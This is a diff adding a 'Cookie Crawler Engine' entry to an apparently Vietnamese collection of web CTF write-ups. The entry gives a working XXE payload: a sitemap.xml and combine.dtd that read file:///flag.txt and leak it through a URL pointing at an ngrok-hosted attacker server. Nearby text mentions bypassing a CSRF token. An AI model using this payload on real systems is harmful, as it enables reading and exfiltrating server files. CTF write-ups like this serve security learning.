@@ -65,6 +65,7 @@
 - [Baby Sqlite with filter](#baby-sqlite-with-filter)
 - [Baby Order By](#baby-order-by)
 - [Movie Vote L1](#movie-vote-l1)
+- [Cookie Crawler Engine](#cookie-crawler-engine)
 
 ## Baby Address Note
 
@@ -892,5 +893,42 @@ print("FLAG=",res)
 6. Với web được public ra bằng docker, localhost:1337 (private) == HOST:PORT_PUBLIC (public), và con bot tự động click link chạy dv ở một port khác trong localhost.
 7. Vậy khi gửi link web public cho bot nó sẽ không access được -> phải gửi link private.
 8. Bài level 3, nó sẽ sử dụng csrf token nhưng có thể bypass bằng cách sử dụng token của user khác mà chưa được sử dụng @@
+
+## Cookie Crawler Engine
+
+1. Theo như mô tả của bài này, nó sẽ request đến một sitemap url và đồng thời sẽ request tới các lop trong sitemap đó.
+2. Có thể theo hướng XXE
+3. Tìm thấy 1 bài có dính lỗ hổng XXE khi parse sitemap [H1](https://hackerone.com/reports/312543)
+4. Host một trang với những file như sau:
+
+``sitemap.xml``
+```
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE urlset [
+ <!ENTITY % goodies SYSTEM "file:///flag.txt">
+ <!ENTITY % dtd SYSTEM "https://f8d0-27-72-144-83.ngrok-free.app/files/combine.dtd">
+%dtd;
+]>
+<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" 
+   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+   xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">
+    <url>
+        <loc>https://f8d0-27-72-144-83.ngrok-free.app/&xxe;</loc>
+        <lastmod>2006-11-18</lastmod>
+        <changefreq>daily</changefreq>
+        <priority>0.8</priority>
+    </url>
+</urlset>
+```
+
+``combine.dtd``
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY xxe "%goodies;">
+```
+
+5. Gửi request
+
+![image](https://github.com/user-attachments/assets/42d3f91f-595e-4681-9067-f09884808258)
 
 ## 
